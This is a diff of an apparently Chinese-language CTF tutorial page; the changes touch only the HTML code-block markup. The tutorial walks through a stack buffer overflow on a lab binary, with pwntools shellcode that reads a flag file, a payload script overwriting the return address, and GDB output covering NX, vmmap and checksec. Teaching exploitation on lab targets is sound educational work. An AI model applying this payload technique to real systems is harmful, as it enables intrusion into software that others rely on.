@@ -71,7 +71,7 @@
 
 <p>在 http://docs.pwntools.com/en/stable/shellcraft/amd64.html#module-pwnlib.shellcraft.amd64.linux 有使用 pwntools 生成 shellcode 的文档。我选择了一个读取文件的 shellcode。</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">code</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s">"flag"</span><span class="p">)</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">asm_code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">code</span>
@@ -98,26 +98,24 @@
 <span class="s">'hflagj</span><span class="se">\x02</span><span class="s">XH</span><span class="se">\x89\xe7</span><span class="s">1</span><span class="se">\xf6\x99\x0f\x05</span><span class="s">A</span><span class="se">\xba\xff\xff\xff\x7f</span><span class="s">H</span><span class="se">\x89\xc6</span><span class="s">j(Xj</span><span class="se">\x01</span><span class="s">_</span><span class="se">\x99\x0f\x05</span><span class="s">'</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">asm_code</span><span class="p">)</span>
 <span class="mi">34</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>因为这段 shellcode 长度只有 34 个字节，完全可以塞入栈中，然后我们使用之前的办法，确定一个返回地址就可以了，这里就是 <code class="highlighter-rouge">student</code> 结构体的起始地址。</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">code</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s">"flag"</span><span class="p">)</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
 <span class="n">data</span> <span class="o">=</span>  <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="mh">0x7fffffffe2f0</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7fffffffe2f0</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">data</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h2 id="nx-栈不可执行">NX 栈不可执行</h2>
 
 <p>在 GDB 中运行，会得到一个 SIGSEGV，并不会得到 flag。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
 What's Your Birth?
 What's Your Name?
@@ -167,14 +165,13 @@ EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
 0x00007fffffffe2f0 in ?? ()
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>而且可以看到我们的地址计算是没问题的，只是 shellcode 第一个指令就挂掉了。</p>
 
 <p>原因是并不是所有的内存区域都可执行的，使用 <code class="highlighter-rouge">vmmap</code> 可以看到，<code class="highlighter-rouge">0x00007fffffffe2f0</code> 所在的区域（<code class="highlighter-rouge">[stack]</code> 区域或者使用 <code class="highlighter-rouge">vmmap 0x00007fffffffe2f0</code>）是 <code class="highlighter-rouge">rw-p</code>，是没有 <code class="highlighter-rouge">x</code> 执行权限的。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ vmmap
 Start              End                Perm	Name
 0x00400000         0x00401000         r-xp	/home/virusdefender/Desktop/pwn/new/vuln
 0x00600000         0x00601000         r--p	/home/virusdefender/Desktop/pwn/new/vuln
@@ -195,19 +192,17 @@ Start              End                Perm	Name
 0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
 0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
 0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>这其实是 Linux 对漏洞利用的缓解措施中的一种，标记部分内存不可执行，使用 <code class="highlighter-rouge">checksec</code> 可以查看漏洞利用缓解措施的状态。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ checksec
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ checksec
 CANARY    : disabled
 FORTIFY   : disabled
 NX        : ENABLED
 PIE       : disabled
 RELRO     : Partial
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><code class="highlighter-rouge">NX</code> 就是标记内存不可执行，这里是 <code class="highlighter-rouge">ENABLED</code> 状态。</p>
 
@@ -219,13 +214,12 @@ RELRO     : Partial
 
 <p>这样就可以看到 student 的内存区域是可执行的了。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap 0x7fffffffe2f0
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ vmmap 0x7fffffffe2f0
 Start              End                Perm	Name
 0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
 What's Your Birth?
 What's Your Name?
@@ -235,8 +229,7 @@ You Speed One Second Here.
 THIS_IS_FLAG
 
 Program received signal SIGSEGV, Segmentation fault.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h2 id="参考">参考</h2>
 
